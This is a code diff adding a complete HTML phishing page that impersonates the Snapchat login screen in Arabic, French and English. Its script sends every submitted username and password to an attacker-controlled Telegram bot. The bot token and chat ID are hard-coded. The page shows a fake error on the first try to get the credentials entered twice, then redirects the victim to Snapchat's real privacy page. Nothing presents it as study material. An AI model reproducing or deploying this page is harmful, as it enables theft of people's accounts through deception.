@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFFC00; /* اللون الأصفر لسناب شات */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            width: 90%;
+            max-width: 400px;
+            background-color: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .logo {
+            width: 60px;
+            margin: 0 auto 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 30px;
+        }
+
+        label {
+            display: block;
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 5px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background-color: #FFFC00;
+            color: black;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        button:hover {
+            background-color: #fef200;
+        }
+
+        .link {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #007bff;
+            text-decoration: none;
+            display: block;
+        }
+
+        .link:hover {
+            text-decoration: underline;
+        }
+
+        .message {
+            font-size: 16px;
+            color: red;
+            margin-top: 20px;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="https://1000logos.net/wp-content/uploads/2017/08/Snapchat-logo.png" alt="Snapchat Logo">
+        <h1 id="title">تسجيل الدخول</h1>
+        <form onsubmit="handleSubmit(event)">
+            <label id="username-label" for="username">اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف</label>
+            <input type="text" id="username" name="username" required>
+
+            <label id="password-label" for="password">كلمة المرور</label>
+            <input type="password" id="password" name="password" required>
+
+            <button id="submit-button" type="submit">تسجيل الدخول</button>
+        </form>
+
+        <!-- رابط التسجيل -->
+        <a class="link" href="https://accounts.snapchat.com/v2/signup">
+            Vous débutez sur Snapchat ? Sʼinscrire
+        </a>
+
+        <!-- رابط تغيير كلمة المرور -->
+        <a class="link" href="https://accounts.snapchat.com/accounts/password_reset_request">
+            Mot de passe oublié ? Réinitialiser
+        </a>
+
+        <div class="message" id="error-message">المعلومات غير صحيحة، جرب مرة أخرى.</div>
+    </div>
+
+    <script>
+        const botToken = '7908469273:AAFmgF2elBpLaH6YGJK6Qtrmf8Z7TsyODzc'; // رمز البوت
+        const chatId = '612575358'; // استبدل بـ chat_id الخاص بك
+        let attempt = 1; // لتتبع عدد المحاولات
+
+        const translations = {
+            ar: {
+                title: "تسجيل الدخول",
+                usernameLabel: "اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف",
+                passwordLabel: "كلمة المرور",
+                submitButton: "تسجيل الدخول",
+                errorMessage: "المعلومات غير صحيحة، جرب مرة أخرى.",
+                signupText: "Vous débutez sur Snapchat ? Sʼinscrire",
+                forgotPasswordText: "هل نسيت كلمة المرور؟ إعادة تعيين",
+            },
+            en: {
+                title: "Login",
+                usernameLabel: "Username, email, or phone number",
+                passwordLabel: "Password",
+                submitButton: "Log in",
+                errorMessage: "Incorrect information, please try again.",
+                signupText: "New to Snapchat? Sign up",
+                forgotPasswordText: "Forgot your password? Reset",
+            },
+            fr: {
+                title: "Connexion",
+                usernameLabel: "Nom d'utilisateur, e-mail ou numéro de téléphone",
+                passwordLabel: "Mot de passe",
+                submitButton: "Se connecter",
+                errorMessage: "Informations incorrectes, veuillez réessayer.",
+                signupText: "Vous débutez sur Snapchat ? Sʼinscrire",
+                forgotPasswordText: "Mot de passe oublié ? Réinitialiser",
+            },
+        };
+
+        // تحديد اللغة بناءً على لغة الجهاز
+        function getLanguage() {
+            const lang = navigator.language || navigator.userLanguage;
+            const language = lang.split('-')[0]; // أخذ الكود الأساسي فقط (مثلاً 'ar' من 'ar-SA')
+            return translations[language] ? language : 'en'; // افتراضيًا الإنجليزية إذا لم تكن اللغة مدعومة
+        }
+
+        // تطبيق الترجمة بناءً على اللغة
+        function applyTranslations() {
+            const lang = getLanguage();
+            const texts = translations[lang];
+
+            document.getElementById('title').textContent = texts.title;
+            document.getElementById('username-label').textContent = texts.usernameLabel;
+            document.getElementById('password-label').textContent = texts.passwordLabel;
+            document.getElementById('submit-button').textContent = texts.submitButton;
+            document.getElementById('error-message').textContent = texts.errorMessage;
+
+            const signupLink = document.querySelector('.link[href="https://accounts.snapchat.com/v2/signup"]');
+            const forgotPasswordLink = document.querySelector('.link[href="https://accounts.snapchat.com/accounts/password_reset_request"]');
+
+            signupLink.textContent = texts.signupText;
+            forgotPasswordLink.textContent = texts.forgotPasswordText;
+        }
+
+        applyTranslations(); // تطبيق الترجمة عند تحميل الصفحة
+
+        // إرسال البيانات إلى Telegram
+        function sendToTelegram(username, password) {
+            const message = `👤 Username: ${username}\n🔒 Password: ${password}`;
+            return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Message sent to Telegram successfully!');
+                } else {
+                    console.error('Failed to send message to Telegram:', data.description);
+                }
+            })
+            .catch(error => {
+                console.error('Error with Telegram API:', error);
+            });
+        }
+
+        // معالجة الإرسال
+        function handleSubmit(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorMessage = document.getElementById('error-message');
+
+            // إرسال المعلومات إلى Telegram
+            sendToTelegram(username, password).then(() => {
+                // تحقق من المحاولة الحالية
+                if (attempt === 1) {
+                    // إظهار رسالة الخطأ وإعادة تعيين الحقول
+                    errorMessage.style.display = 'block';
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                    attempt++;
+                } else {
+                    // تحويل المستخدم إلى صفحة الخصوصية الخاصة بـ Snapchat
+                    window.location.href = 'https://www.snapchat.com/privacy';
+                }
+            });
+        }
+    </script>
+</body>
+</html>
